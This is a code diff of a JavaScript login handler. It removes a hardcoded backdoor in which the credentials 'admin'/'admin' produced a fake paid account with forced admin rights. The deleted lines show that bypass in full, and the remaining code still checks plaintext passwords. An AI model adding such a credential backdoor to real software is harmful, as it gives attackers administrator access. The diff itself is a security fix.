@@ -97,13 +97,11 @@ export default function handler(req, res) {
     ];
 
     const admins = ["يوسف", "فراو", "frau_farida", "frau_rawan"];
-    const user = username === 'admin' && password === 'admin'
-        ? { username: 'Polyglot', password, payment_status: 'Paid', forceAdmin: true }
-        : users.find(u => u.username === username && u.password === password);
+    const user = users.find(u => u.username === username && u.password === password);
 
     if (user) {
         if (user.payment_status === 'Paid') {
-            const isAdmin = user.forceAdmin === true || admins.includes(user.username);
+            const isAdmin = admins.includes(user.username);
             const responseData = { 
                 success: true, 
                 user: { 
